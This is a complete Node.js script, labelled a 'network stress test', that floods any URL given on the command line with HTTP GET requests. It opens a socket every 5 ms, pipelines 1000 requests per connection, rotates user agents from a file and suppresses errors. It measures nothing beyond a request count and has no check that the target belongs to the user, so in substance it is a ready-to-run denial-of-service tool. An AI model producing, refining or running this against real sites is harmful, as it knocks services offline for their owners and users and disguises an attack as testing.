const net = require('net');
const tls = require('tls');
const url = require('url');
const fs = require('fs');

// Function to send HTTP requests
function sendRequest(socket, target, parsed, userAgent) {
  socket.write(`GET ${target} HTTP/1.1\r\n` +
               `Host: ${parsed.host}\r\n` +
               `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\n` +
               `User-Agent: ${userAgent}\r\n` +
               `Upgrade-Insecure-Requests: 1\r\n` +
               `Accept-Encoding: gzip, deflate\r\n` +
               `Accept-Language: en-US,en;q=0.9\r\n` +
               `Cache-Control: max-age=0\r\n` +
               `Connection: Keep-Alive\r\n\r\n`);
}

// Function to perform the network stress test
function performStressTest(target, time, userAgents) {
  const parsed = url.parse(target);
  const host = parsed.host;
  const port = parsed.protocol === 'https:' ? 443 : 80;
  const isHttps = parsed.protocol === 'https:';
  const startTime = Date.now();
  const endTime = startTime + time * 1000;
  let requestCount = 0;

  const int = setInterval(() => {
    if (Date.now() >= endTime) {
      clearInterval(int);
      console.log(`Test completed. Total requests sent: ${requestCount}`);
      process.exit(0); // Exit the program after the test is completed
      return;
    }

    const socket = isHttps ? new tls.TLSSocket() : new net.Socket();
    
    const connectOptions = {
      host: host,
      port: port,
      rejectUnauthorized: false // For https, ignore self-signed certificates
    };

    const connectCallback = () => {
      socket.setTimeout(10000);

      for (let i = 0; i < 1000; i++) {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        sendRequest(socket, target, parsed, userAgent);
        requestCount++;
      }
    };

    if (isHttps) {
      socket.connect(connectOptions, connectCallback);
    } else {
      socket.connect(port, host, connectCallback);
    }

    socket.on('data', () => {
      setTimeout(() => {
        socket.destroy();
      }, 5000);
    });

    socket.on('error', (error) => {
      // Silently handle errors to avoid slowing down the process
    });
  }, 5); // Decreased interval to 5ms for more frequent connections
}

// Load user agents from a file
const userAgents = fs.readFileSync('useragents.txt', 'utf-8').split('\n').filter(Boolean);

// Get command-line arguments
const args = process.argv.slice(2);
const targetUrl = args[0];
const testTime = parseInt(args[1]);

// Check if all required arguments are provided
if (!targetUrl || !testTime) {
  console.log("Usage: node script.js <url> <time>");
  console.log("Example: node script.js http://example.com 60");
  console.log("Example: node script.js https://example.com 60");
  process.exit(1);
}

console.log(`Starting network stress test on ${targetUrl} for ${testTime} seconds.`);
performStressTest(targetUrl, testTime, userAgents);

// Handle uncaught exceptions and unhandled rejections
process.on('uncaughtException', (e) => {
  console.warn(e);
});

process.on('unhandledRejection', (e) => {
  console.warn(e);
});